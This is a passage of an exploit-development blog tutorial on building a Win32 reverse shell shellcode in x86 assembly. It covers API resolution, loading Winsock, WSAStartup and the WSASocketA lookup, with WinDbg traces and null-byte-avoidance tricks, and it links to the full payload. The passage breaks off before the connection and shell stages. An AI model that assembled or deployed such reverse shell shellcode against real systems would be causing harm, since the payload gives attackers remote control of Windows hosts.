---
layout: single
title: 'Win32 reverse shellcode - pt .3 - Constructing the reverse shell connection'
description: 'This blog post shows how to construct a reverse shell connection'
date: 2021-08-05
classes: wide
comments: false
header:
  teaser: /assets/images/avatar.jpg
tags:
  - WinDbg
  - Win32 assembly
  - Exploit Development
  - Windows API
  - Windows Sockets 
  - reverse shellcode 
--- 

<p align="justify">
This article focuses on finalizing the construction of a tcp socket connection as well as explains the instructions regarding the establishment of a cmd shell interaction with the attacking machine using x86 assembly. This is the third and final part of a blog series that focuses on how to create a custom Win32 reverse shell shellcode. 

<br><br>
The full shellcode, the STUB and assembly instructions can be found at 
</p>


* [exploit-db](https://www.exploit-db.com/shellcodes/50291)
* [github](https://github.com/xen0vas/Windows-x86_64-Reverse-TCP-Shellcode)
* [packetstormsecurity](https://packetstormsecurity.com/files/164131/Windows-x86-Reverse-TCP-Shellcode.html)


<p align="justify">
The first and second part of the blog series can be found at the following links 
</p>

* [Win32 reverse shellcode - pt .1 - Locating the kernelbase.dll base address](https://xen0vas.github.io/Win32-Reverse-Shell-Shellcode-part-1-Locating-the-kernelbase-address/)

* [Win32 reverse shellcode - pt .2 - locating the Export Directory Table](https://xen0vas.github.io/Win32-Reverse-Shell-Shellcode-part-2-Locate-the-Export-Directory-Table/)

<p align="justify">
At the previous blog posts we have accomplished to find the kernelbase base address, and from there, we managed to access to the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function, which can help us further to retrieve the addresses of the exported functions from specified dynamic libraries. At this blog post we will continue from the point we stopped at the previous post. A first step in the process of constructing a tcp socket connection, is to search for the <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> function in order to load the <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library, because we need to use the Winsock functions provided by this dynamic-link library. 
</p>

<hr>
<b><span style="color:green;font-size:26px">Search for the LoadLibraryA function address</span></b>
<br><br>

<p align="justify">
At this point we will be searching for the address of <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> function in order use it later to load <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library. This library contains specific socket functions that will be used in our shellcode
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
XOR ECX,ECX     ; ECX = 0
PUSH EBX        ; kernelbase base address
PUSH EDX        ; GetProcAddress
PUSH ECX        ; 0
PUSH 41797261   ; "Ayra"
PUSH 7262694C   ; "rbiL"
PUSH 64616F4C   ; "daoL"
PUSH ESP        ; "LoadLibrary"
PUSH EBX        ; kernelbase base address
MOV  ESI, EBX   ; save the kernelbase address in esi for later
CALL EDX        ; GetProcAddress(LoadLibraryA)
</pre>

<p align="justify">
At the assembly code above, at the first line, we set <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> to zero. Then, at the second line, we save <code  style="background-color: lightgrey; color:black;"><b>ebx</b></code> on the stack. As we saw at the previous blog post, the <code  style="background-color: lightgrey; color:black;"><b>ebx</b></code> register holds the <code  style="background-color: lightgrey; color:black;"><b>kernelbase.dll</b></code> base address and now we want to save this address on the stack in order to use it later. At the third line we also save the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> on the stack. The <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register contains the pointer to the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function.
</p>

<p align="justify">
At this point we need to use <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> in order to find the address of <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> function from <code  style="background-color: lightgrey; color:black;"><b>kernelbase.dll</b></code>. More specifically, we have to initiate the following function call: <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress(kernelbase, "LoadLibraryA")</b></code>. As we already know, the <code style="background-color: lightgrey; color:black;"><b>kernelbase</b></code> address is placed inside the <code  style="background-color: lightgrey; color:black;"><b>ebx</b></code> register. Next we will place the  <code  style="background-color: lightgrey; color:black;"><b>"LoadLibraryA\0"</b></code> string on the stack. The string must be <b>NULL</b> or <b>\0</b> terminated and this can be achieved by pushing <code  style="background-color: lightgrey; color:black;"><b>ecx</b></code> on the stack which has the <b>NULL</b> byte value. Afterwards, we will place the <b>"LoadLibraryA"</b> string on the stack, four(4) bytes at a time in reverse order. First we are placing <b>"Ayra"</b>, then <b>"rbiL"</b> and then <b>"daoL"</b>, so the string on the stack will be <b>"LoadLibraryA"</b>. 
<br><br>
Furthermore, we will push the <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> register on the stack and then it will point to the beginning of the <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> string. Afterwards, we will push the <code  style="background-color: lightgrey; color:black;"><b>ebx</b></code> register on the stack which holds the <code  style="background-color: lightgrey; color:black;"><b>kernelbase.dll</b></code> base address. Then, we will save the <code  style="background-color: lightgrey; color:black;"><b>kernelbase.dll</b></code> address in <code  style="background-color: lightgrey; color:black;"><b>esi</b></code> in order to use it later. At last, we will call <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> which holds a pointer at the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> address.
<br><br>

In order to figure out that the above code works well, we must perform some debugging using WinDbg. First we must load the executable that we have previously compiled and build using Virtual Studio 2017. Below we see the source code of the <code  style="background-color: lightgrey; color:black;"><b>testasm.exe</b></code> executable. 
</p>

```c
#include <windows.h>

int main(int argc, char* argv[])
{
  LoadLibrary("user32.dll");
  _asm
  {
    // Locate Kernelbase.dll address
    XOR ECX, ECX              // zero out ECX
    MOV EAX, FS:[ecx + 0x30]  // EAX = PEB
    MOV EAX, [EAX + 0x0c]     // EAX = PEB->Ldr
    MOV ESI, [EAX + 0x14]     // ESI = PEB->Ldr.InMemoryOrderModuleList
    LODSD                     // memory address of the second list entry structure
    XCHG EAX, ESI             // EAX = ESI , ESI = EAX 
    LODSD                     // memory address of the third list entry structure
    XCHG EAX, ESI             // EAX = ESI , ESI = EAX 
    LODSD                     // memory address of the fourth list entry structure
    MOV EBX, [EAX + 0x10]     // EBX = Base address


    // Export Table 
    MOV EDX, DWORD PTR DS:[EBX + 0x3C]    //EDX = DOS->e_lfanew
    ADD EDX, EBX                          //EDX = PE Header
    MOV EDX, DWORD PTR DS:[EDX + 0x78]    //EDX = Offset export table
    ADD EDX, EBX                          //EDX = Export table
    MOV ESI, DWORD PTR DS:[EDX + 0x20]    //ESI = Offset names table
    ADD ESI, EBX                          //ESI = Names table
    XOR ECX, ECX                          //EXC = 0

    GetFunction :

    INC ECX                                 //increment counter
    LODSD                                   //Get name offset
    ADD EAX, EBX                            //Get function name
    CMP[EAX], 0x50746547                    //"PteG"
    JNZ SHORT GetFunction                   //jump to GetFunction label if not "GetP"
    CMP[EAX + 0x4], 0x41636F72              //"rocA"
    JNZ SHORT GetFunction                   //jump to GetFunction label if not "rocA"
    CMP[EAX + 0x8], 0x65726464              //"ddre"
    JNZ SHORT GetFunction                   //jump to GetFunction label if not "ddre"

    MOV ESI, DWORD PTR DS:[EDX + 0x24]      //ESI = Offset ordinals
    ADD ESI, EBX                            //ESI = Ordinals table
    MOV CX, WORD PTR DS:[ESI + ECX * 2]     //CX = Number of function
    DEC ECX                                 //Decrement the ordinal
    MOV ESI, DWORD PTR DS:[EDX + 0x1C]      //ESI = Offset address table
    ADD ESI, EBX                            //ESI = Address table
    MOV EDX, DWORD PTR DS:[ESI + ECX * 4]   //EDX = Pointer(offset)
    ADD EDX, EBX                            //EDX = GetProcAddress

    // Get the Address of LoadLibraryA function 
    XOR ECX, ECX              //ECX = 0
    PUSH EBX                  //Kernelbase base address
    PUSH EDX                  //GetProcAddress
    PUSH ECX                  //0
    PUSH 0x41797261           //"Ayra"
    PUSH 0x7262694C           //"rbiL"
    PUSH 0x64616F4C           //"daoL"
    PUSH ESP                  //"LoadLibrary"
    PUSH EBX                  //Kernelbase base address
    MOV  ESI, EBX             //save the Kernelbase address in esi for later
    CALL EDX                  //GetProcAddress(LoadLibraryA)
  
  }
  return 0;
}
```

<p align="justify">
It's worth to mention here that the code above until the 49th line has been analysed and explained in previous articles, <a href="https://xen0vas.github.io/Win32-Reverse-Shell-Shellcode-pt1-Locating-the-kernelbase-base-address/">[pt .1]</a> and <a href="https://xen0vas.github.io/Win32-Reverse-Shell-Shellcode-part-2-Locate-the-Export-Directory-Table/">[pt .2]</a> accordingly. 
</p>

<p align="justify">
Starting our analysis, we open WinDbg and then by pressing <code  style="background-color: lightgrey; color:black;"><b>Ctrl+E</b></code> we are able to load the executable. Furthermore, at the current Windows machine the path of the executable file is located at the path<code  style="background-color: lightgrey; color:black;"><b>C:\Users\Xenofon\source\repos\testasm\Debug</b></code>. Afterwards, we will load the debug symbols running the command <code style="background-color: lightgrey; color:black;"><b>.symfix</b></code> in WinDbg and also running the command <code style="background-color: lightgrey; color:black;"><b>.sympath+ C:\Users\Xenofon\source\repos\testasm\testasm\Debug</b></code>, in order to load the symbols from the corresponding <code style="background-color: lightgrey; color:black;"><b>.pdb</b></code> file. Then we run the command <code  style="background-color: lightgrey; color:black;"><b>.reload</b></code> in order to reload the symbols in WinDbg. In order to see the symbols we run <code  style="background-color: lightgrey; color:black;"><b>x testasm!*</b></code>
</p>


<p align="justify">
Then, running <code  style="background-color: lightgrey; color:black;"><b>lm</b></code> we see the name of the executable
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> lm 
start    end        module name
00f80000 00f9f000   testasm  C (private pdb symbols)  C:\ProgramData\dbg\sym\testasm.pdb\AB9156DB047544CF917F630DA807EA0D3\testasm.pdb
712d0000 71444000   ucrtbased   (deferred)             
71450000 7146b000   VCRUNTIME140D   (deferred)             
75cb0000 75ec3000   KERNELBASE   (deferred)             
75f50000 76040000   KERNEL32   (deferred)             
77580000 77722000   ntdll      (pdb symbols)          C:\ProgramData\dbg\sym\wntdll.pdb\DBC8C8F74C0E3696E951B77F0BB8569F1\wntdll.pdb
</pre>


<p align="justify">
Afterwards, we run <code  style="background-color: lightgrey; color:black;"><b>bu testasm!main</b></code> in order to put a breakpoint in the main function of the executable. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> bu testasm!main
0:000> bl
     0 e Disable Clear  00f916f0     0001 (0001)  0:**** testasm!main
</pre>

<p align="justify">
Moreover, at this exercise, WinDbg has been opened using a workspace with the dark-green theme loaded. The dark-green theme can found it at this <a href="https://github.com/nextco/windbg-readable-theme">repo</a> . Using the theme, we can see many windows in WinDbg without running extra commands, which is very usefull. Among other windows, the following screenshot shows the source code window. Running the <code  style="background-color: lightgrey; color:black;"><b>g</b></code> command, the execution will continue until we hit the breakpoint and the line of code is highlighted in red as seen at the screenshot below. 
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/08/source_code.png" alt="WinDbg Source Code"/>

<p align="justify">
Furthermore, we are now in position to put a breakpoint at the first instruction <code style="background-color: lightgrey; color:black;"><b>XOR ECX, ECX</b></code>. Moreover, we can proceed further and press <code  style="background-color: lightgrey; color:black;"><b>Alt+7</b></code> or press <code  style="background-color: lightgrey; color:black;"><b>view->disassembly</b></code> in order to open a new dissasembly window that shows the instructions and corresponding addresses of the provided source code as we also see at the image below.  
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/07/Disassembly-Window-GetProcAddress.png" alt="WinDbg Disassembly Window"/>

<b><span style="color:green;font-size:26px">Call the LoadLibraryA to load ws2_32.dll</span></b>

<p align="justify">
In order to find the addresses of the following functions 
</p>

<ul>
 <li><code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code></li>
 <li><code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code></li>
 <li><code  style="background-color: lightgrey; color:black;"><b>connect</b></code></li>
</ul>

<p align="justify">
These functions can be found inside the following <b>.dll</b> library
</p>

 * **`ws2_32.dll`**

<p align="justify">
At this point we need to load the  <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library by using <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code>. So, to find the address of the functions above, we will first load the <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library using the assembly code below 
</p>

```c
ADD ESP,0xC          ; pop "LoadLibraryA"
POP EDX              ; EDX = 0
PUSH EAX             ; EAX = LoadLibraryA
PUSH EDX             ; EDX = 0
MOV DX,0x6C6C        ; "ll"
PUSH EDX
PUSH 0x642E3233      ; "d.23"
PUSH 0x5F327377      ; "_2sw"
PUSH ESP             ; "ws2_32.dll"
CALL EAX             ; LoadLibrary("ws2_32.dll")
```

<p align="justify">
First we clean up the stack. In line two, before pushing the address of <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> on the stack, we remove the zero value placed on top of the stack using <code  style="background-color: lightgrey; color:black;"><b>pop edx</b></code> and this also sets the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register to zero. The address of <code  style="background-color: lightgrey; color:black;"><b>LoadLibraryA</b></code> will be saved on the stack in order to use it later, and that because after calling a function, the return value will be saved inside the <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register, thus changing its current value.
<br><br>
Now it is time to call <code  style="background-color: lightgrey; color:black;"><b>LoadLibrary("ws2_32.dll")</b></code>. So we need to place the string <code  style="background-color: lightgrey; color:black;"><b>"ws2_32.dll"</b></code> on the stack. Moreover, the string length is not a multiple of 4 bytes and we cannot directly place it onto the stack. Instead, we  push the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register on the stack, which has the <code  style="background-color: lightgrey; color:black;"><b>0x0</b></code> value, and then we use the <code  style="background-color: lightgrey; color:black;"><b>dx</b></code> register to place the <b>"ll"</b> string on the stack ( <code  style="background-color: lightgrey; color:black;"><b>0x6C6C</b></code> in hex ). Afterwards, we push the <code  style="background-color: lightgrey; color:black;"><b>"ws2_32.d"</b></code> string on the stack and then by pushing the <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> register on the stack we are located at the begining of the<code  style="background-color: lightgrey; color:black;"><b>"ws2_32.dll"</b></code> string. Then, by calling <code  style="background-color: lightgrey; color:black;"><b>eax</b></code>, the <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> library is loaded. Then, the base address of <code  style="background-color: lightgrey; color:black;"><b>ws2_32.dll</b></code> is the address where the DLL is loaded into the memory and it will be returned in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register.
</p>

<b><span style="color:green;font-size:26px">Get the WSAStartup address using GetProcAddress</span></b>

<p align="justify">
At this point we first need to find the address of the following function 
</p>

```c
; Find the address of WSAStartup
ADD  ESP,0x10                      ; Clean stack
MOV  EDX, [ESP+0x4]                ; EDX = GetProcAddress
PUSH 0x61617075                    ; "aapu"
SUB  WORD [ESP + 0x2], 0x6161      ; "pu" (remove "aa")
PUSH 0x74726174                    ; "trat"
PUSH 0x53415357                    ; "SASW"
PUSH ESP                           ; "WSAStartup"
PUSH EAX                           ; ws2_32.dll address
MOV  EDI, EAX                      ; save ws2_32.dll to use it later
CALL EDX                           ; GetProcAddress(WSAStartup)
```

<p align="justify">
Again, on the first line we have to clean the stack. In line two, the address of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function will be placed inside the <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> register. It is worth to mention that after a function call, the <code  style="background-color: lightgrey; color:black;"><b>eax</b></code>, </ecx> and <code  style="background-color: lightgrey; color:black;"><b>edx</b></code> will be modified because they are not preserved. We can also check that <code  style="background-color: lightgrey; color:black;"><b>[esp+0x4]</b></code> points to the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function either by watching the memory bytes in little endian format or by using the  <code  style="background-color: lightgrey; color:black;"><b>dt poi(esp+0x4)</b></code> command in WinDbg when debugging the executable 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> db esp 
0083f924  30 f6 7d 75 <span style="color:#cd0000;"><b>a0 63 7e 75</b></span>-00 00 6d 75 20 13 88 00  0.}u.c~u..mu ...
0083f934  20 13 88 00 00 e0 a8 00-cc cc cc cc cc cc cc cc   ...............
0083f944  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0083f954  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0083f964  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0083f974  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0083f984  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0083f994  cc cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
0:000> dt poi(esp+0x4)
GetProcAddress
0:000> x kernelbase!GetProcAddress
<span style="color:#cd0000;"><b>757e63a0</b></span>         KERNELBASE!GetProcAddress (void)
</pre>

<p align="justify">
We can also see this in the Disassembly Window in Windbg 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
008817ac 8b542404  mov  edx,dword ptr [esp+4] ss:002b:0083f928={KERNELBASE!GetProcAddress (757e63a0)}
</pre>

<p align="justify">
Now its time to call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress(ws2_32.dll, "WSAStartup")</b></code>, so we need to push <b>"WSAStartup"</b> string on the stack. Moreover, the string length is not a multiple of 4 bytes and we cannot directly place it on the stack. Instead, we will first push <code  style="background-color: lightgrey; color:black;"><b>0x61617075</b></code> hex value on the stack which represents the value <b>"aapu"</b> in ascii char format. Then, the next instruction will remove the two suplementary a's leaving the <b>"pu"</b> part of the string untouched. Afterwards the string <b>"trat"</b> and then the string <b>"SASW"</b> will also be pushed into the stack in little endian format. Next, we will push the <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register which contains the <b>ws2_32.dll</b> base address and then before we call the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function, we should save its address in <code  style="background-color: lightgrey; color:black;"><b>EDI</b></code> register to use it later. Then, we will call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code>. At this point we will have the address of <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function in <code  style="background-color: lightgrey; color:black;"><b>eax</b></code> register. 
</p>

<b><span style="color:green;font-size:26px">Call the WSAStartup function</span></b>
<br><br>

<p align="justify">
Now that we know the address of <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function, it is time to call and execute this function. Acording to Microsoft Docs, the function prototype of the <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function is the following 
</p>

```c

int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);

```


Function parameters :

>wVersionRequired

* The highest version that the calling application requires

>lpWSAData

* A pointer to the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> data structure that is to receive details of the <b>Windows Sockets</b> implementation.


<p align="justify">
The <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function initializes the utilization of the <b>winsock DLL</b>. The following code used to implement the <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function.
</p>

```c
;; Call WSAStartup
XOR  EBX, EBX          ; zero out ebx register
MOV  BX,  0x0190       ; EAX = sizeof( struct WSAData )
SUB  ESP, EBX          ; allocate space for the WSAData structure
PUSH ESP               ; push a pointer to WSAData structure
PUSH EBX               ; Push EBX as wVersionRequested 
CALL EAX               ; Call WSAStartUp
```

<p align="justify">
At the first line above, the <code  style="background-color: lightgrey; color:black;"><b>ebx</b></code> register is zeroed out. Then, at the second line, the hex value <code  style="background-color: lightgrey; color:black;"><b>0x190</b></code> which is the length of the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure will be moved to the lower register <code  style="background-color: lightgrey; color:black;"><b>BX</b></code>. In order to be sure about the length of the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure, we can compile and run the following program in visual studio 
</p>

```c

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int __cdecl main()
{
  WORD wVersionRequested;
  WSADATA wsaData;
  int err;
  wVersionRequested = MAKEWORD(2, 2);
  err = WSAStartup(wVersionRequested, &wsaData);
  printf("WSAStartup structure size: 0x%x\n\n", sizeof(wsaData));
  WSACleanup();
}
```

<p align="justify">
As seen at the screenshot below, the length of the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure is <code  style="background-color: lightgrey; color:black;"><b>0x190</b></code>
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/08/wsa.png" alt="WSAData Length "/>

<p align="justify">
 Furthemore, at the third line we are making some space on the stack for the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure and then <code  style="background-color: lightgrey; color:black;"><b>esp</b></code> points to <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure. A pointer to the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure is generally used to receive details of the <b>Windows Sockets</b> implementation. Then at the fifth line we will push the version of the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> structure. The fifth instruction worked because, if the version requested by the application is equal to or higher than the lowest version supported by the <code  style="background-color: lightgrey; color:black;"><b>Winsock DLL</b></code>, the call succeeds and the <code  style="background-color: lightgrey; color:black;"><b>Winsock DLL</b></code> returns detailed information in the <code  style="background-color: lightgrey; color:black;"><b>WSADATA</b></code> structure pointed to by the <code  style="background-color: lightgrey; color:black;"><b>lpWSAData</b></code> parameter. For this reason we have used the length of the <code  style="background-color: lightgrey; color:black;"><b>WSAData</b></code> stored at <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code>, because the value is much bigger than the supported version and this allow us to use lesser assembly code which also means lesser opcodes. In general, the current version of the <b>Windows Sockets</b> specification is version 2.2. At the last line we execute the <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function. 
</p>

<b><span style="color:green;font-size:26px">Get WSASocketA using GetProcAddress</span></b>

<p align="justify">
At this point we are in position to search for the address of <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function. The following assembly code will be used in order to find the address of the <code  style="background-color: lightgrey; color:black;"><b>WSASocketA</b></code> function
</p>

```c
;;Find the address of WSASocketA
ADD  ESP,0x10                  ;Align the stack
XOR  EBX, EBX                  ;zero out the EBX register
ADD  BL, 0x4                   ;add 0x4 at the lower register BL
IMUL EBX, 0x64                 ;EBX = 0x190
MOV  EDX,[ESP+EBX]             ;EDX has the address of GetProcAddress
PUSH dword 0x61614174          ;"aaAt"
SUB  word [ESP + 0x2], 0x6161  ;"At" (remove "aa")
PUSH dword 0x656b636f          ;"ekco"
PUSH dword 0x53415357          ;"SASW"
PUSH ESP                       ;"WSASocketA" ,GetProcAddress 2nd argument 
MOV  EAX, EDI                  ;EAX now holds the ws2_32.dll address
PUSH EAX                       ;push the first argument of GetProcAddress
CALL EDX                       ;call GetProcAddress
PUSH EDI                       ;save the ws2_32.dll address to use it later
```

<p align="justify">
Now its time to call <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress(ws2_32.dll, "WSASocketA")</b></code>, so we have to push <b>"WSASocketA"</b> string on the stack. Moreover, once again, at the first line we are making space on the stack. Then, at the second line we are zeoroing out the <code  style="background-color: lightgrey; color:black;"><b>EBX</b></code> register. At lines 3-5 we are moving the contents pointed by <code  style="background-color: lightgrey; color:black;"><b>[ESP+0x190]</b></code> ( the address of <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> ) to the <code  style="background-color: lightgrey; color:black;"><b>EDX</b></code> register. We can see this in memory below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> db esp L200
001efb48  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001efb58  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001efb68  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001efb78  ee 03 1b 77 7a 14 65 f6-80 fc 1e 00 38 10 14 77  ...wz.e.....8..w
001efb88  90 a4 5b 00 c8 17 57 00-00 00 00 00 48 11 14 77  ..[...W.....H..w
001efb98  c8 fc 1e 00 c8 17 57 00-2b 12 14 77 00 00 00 00  ......W.+..w....
001efba8  b4 fc 1e 00 00 00 00 00-c8 fc 1e 00 00 00 00 00  ................
001efbb8  65 00 72 00 09 00 00 00-c8 17 57 00 60 3a 5b 00  e.r.......W.`:[.
001efbc8  09 00 00 00 04 00 00 00-c0 9c 92 76 90 a4 5b 00  ...........v..[.
001efbd8  c8 fc 1e 00 58 4d 5b 00-0c fe 1e 00 20 94 17 77  ....XM[..... ..w
001efbe8  fe 41 5b 81 fe ff ff ff-4c fc 1e 00 7d 51 18 77  .A[.....L...}Q.w
001efbf8  50 4d 5b 00 a4 51 18 77-58 4d 5b 00 00 00 5b 00  PM[..Q.wXM[...[.
001efc08  00 00 c5 76 00 00 00 00-00 00 00 00 00 00 00 00  ...v............
001efc18  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001efc28  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
001efc38  00 00 00 00 58 52 75 6e-6e 69 6e 67 00 00 5b 00  ....XRunning..[.
001efc48  88 fc 1e 00 6c fc 1e 00-86 86 14 77 00 00 00 00  ....l......w....
001efc58  00 00 00 00 00 00 00 00-ac fd 1e 00 a8 fc 1e 00  ................
001efc68  00 00 c5 76 80 fc 1e 00-68 ba 12 77 00 00 5b 00  ...v....h..w..[.
001efc78  00 00 00 00 fe 13 65 f6-b8 fc 1e 00 ea 63 d6 76  ......e......c.v
001efc88  00 00 92 76 ac fc 1e 00-00 00 00 00 b4 fc 1e 00  ...v............
001efc98  00 00 00 00 c8 17 57 00-ac fd 1e 00 00 00 c5 76  ......W........v
001efca8  00 00 c5 76 0a 00 0b 00-c8 fc 1e 00 c0 9c 92 76  ...v...........v
001efcb8  ac fd 1e 00 c8 17 00 00-00 00 92 76 c8 fc 1e 00  ...........v....
<span style="color:#cd0000;"><b>001efcc8</b></span>  57 53 41 53 74 61 72 74-75 70 00 61 30 f6 d5 76  WSAStartup.a0..v
001efcd8  a0 63 d6 76 00 00 c5 76-20 13 57 00 20 13 57 00
</pre>

<p align="justify">
As we see above (highlighted in red) at address <code  style="background-color: lightgrey; color:black;"><b>001efcc8</b></code>, there is the argument <b>"WSAStartup"</b> that we have used earlier with <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function, when we were searching for the address of <code  style="background-color: lightgrey; color:black;"><b>WSAStartup</b></code> function.   
</p>

<p align="justify">
Furthermore, we can confirm that the highlighted address above points to the <code  style="background-color: lightgrey; color:black;"><b>GetProcAddress</b></code> function 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> dt poi(001efcd8)
GetProcAddress
</pre>

<p align="justify">
Moreover, we cannot just use the instruction <code  style="background-color: lightgrey; color:black;"><b>mov EBX, [ESP+0x190]</b></code> because this instruction produces null bytes as we also see below.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
nasm > mov ebx, [esp+0x190]
00000000  8B9C2490010000    mov ebx,[esp+0x190]
nasm >
</pre>

<p align="justify">
